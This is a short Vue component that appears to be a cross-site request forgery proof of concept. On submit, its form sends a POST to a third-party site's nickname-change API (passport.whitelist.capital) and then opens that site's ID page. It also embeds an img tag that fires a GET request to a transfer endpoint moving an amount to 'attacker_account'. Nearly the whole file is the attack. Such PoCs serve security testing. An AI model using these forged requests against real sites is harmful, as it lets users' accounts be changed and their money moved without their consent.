<script setup lang="ts">
import { ref } from 'vue';

const form = ref<null | HTMLFormElement>(null);
const nickname = ref('new_nickname');
const submitHandler = (): void => {
  if (!form.value) return;
  form.value.submit();
  window.open('https://passport.whitelist.capital/id/');
};
</script>

<template>
  <div>Изменить никнейм:</div>
  <form ref="form" action="https://passport.whitelist.capital/api/v1/user/nickname/" method="POST">
    <input name="nickname" v-model="nickname" />
    <button @click="submitHandler">submit</button>
  </form>
  <img src="https://example.com/transfer.php?amount=100&recipient=attacker_account" />
</template>

<style scoped lang="scss"></style>
